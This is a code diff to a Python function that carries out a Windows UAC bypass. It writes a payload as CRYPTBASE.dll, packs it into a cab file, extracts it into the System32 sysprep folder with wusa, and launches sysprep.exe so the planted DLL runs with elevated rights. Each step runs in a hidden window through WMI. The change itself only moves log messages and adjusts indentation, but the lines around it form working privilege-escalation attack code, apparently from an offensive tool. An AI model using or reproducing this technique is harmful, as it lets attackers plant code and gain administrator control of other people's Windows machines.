@@ -31,20 +31,22 @@ def sysprep(payload):
 	if (os.path.isfile(os.path.join(payload)) == True):
 		try:
 			payload_data = open(os.path.join(payload),"rb").read()
-			print_success("Successfully read payload data")
 		except Exception as error:
 			print_error("Unable to read payload data")
 			return False
+		else:
+			print_success("Successfully read payload data")
 		
 		print_info("Attempting to save payload to: {}".format(tempfile.gettempdir()))
 		try:
 			dll_file = open(os.path.join(tempfile.gettempdir(),"CRYPTBASE.dll"),"wb")
 			dll_file.write(payload_data)
 			dll_file.close()
-			print_success("Successfully saved payload in: {}".format(tempfile.gettempdir()))
 		except Exception as error:
 			print_error("Unable to save payload to disk")
 			return False
+		else:
+			print_success("Successfully saved payload in: {}".format(tempfile.gettempdir()))
 	
 	print_info("Pausing for 5 seconds before creating cabinet file")
 	time.sleep(5)
@@ -56,8 +58,8 @@ def sysprep(payload):
 	print_info("Attempting to create cabinet file")
 	if (os.path.isfile(os.path.join(tempfile.gettempdir(),"CRYPTBASE.dll")) == True):
 		makecab = wmi.Win32_Process.Create(CommandLine="cmd.exe /c makecab {} {}".format(os.path.join(tempfile.gettempdir(),"CRYPTBASE.dll"),
-											os.path.join(tempfile.gettempdir(),"suspicious.cab")),
-											ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
+								os.path.join(tempfile.gettempdir(),"suspicious.cab")),
+								ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
 		
 		time.sleep(5)
 
@@ -83,7 +85,7 @@ def sysprep(payload):
 	print_info("Attempting to extract the cabinet file")
 	if (os.path.isfile(os.path.join(tempfile.gettempdir(),"suspicious.cab")) == True):
 		wusa = wmi.Win32_Process.Create(CommandLine="cmd.exe /c wusa {} /extract:{}\sysprep /quiet".format(os.path.join(tempfile.gettempdir(),"suspicious.cab"),system_directory()),
-											ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
+							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
 		
 		time.sleep(5)
 
@@ -109,7 +111,7 @@ def sysprep(payload):
 	print_info("Attempting to run sysprep executable")
 	if (os.path.isfile(os.path.join(system_directory(),"\sysprep\CRYPTBASE.dll")) == True):
 		sysprep = wmi.Win32_Process.Create(CommandLine="cmd.exe /c {}\sysprep\sysprep.exe".format(system_directory()),
-											ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
+								ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
 					
 		time.sleep(5)
 
